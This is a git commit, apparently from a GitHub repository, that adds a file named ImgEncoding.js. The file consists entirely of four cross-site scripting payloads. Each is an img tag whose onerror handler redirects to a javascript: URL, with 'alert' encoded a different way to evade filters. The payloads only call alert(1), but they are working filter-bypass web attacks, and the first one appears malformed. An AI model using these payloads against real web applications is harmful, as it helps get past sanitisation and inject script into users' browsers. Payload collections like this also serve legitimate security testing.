af9b4713747eb49f48f3fb677e54e3ece5647867
Harusenpai <30319832+Harusenpai@users.noreply.github.com>
2018-11-28 16:17:03 -0300

    Add files via upload

---
+++ ImgEncoding.js
@@ -0,0 +1,4 @@
+<img onerror="location='javascript:=lert(1)'" src="x">
+<img onerror="location='javascript:%61lert(1)'" src="x">
+<img onerror="location='javascript:\x2561lert(1)'" src="x">
+<img onerror="location='javascript:\x255Cu0061lert(1)'" src="x" >
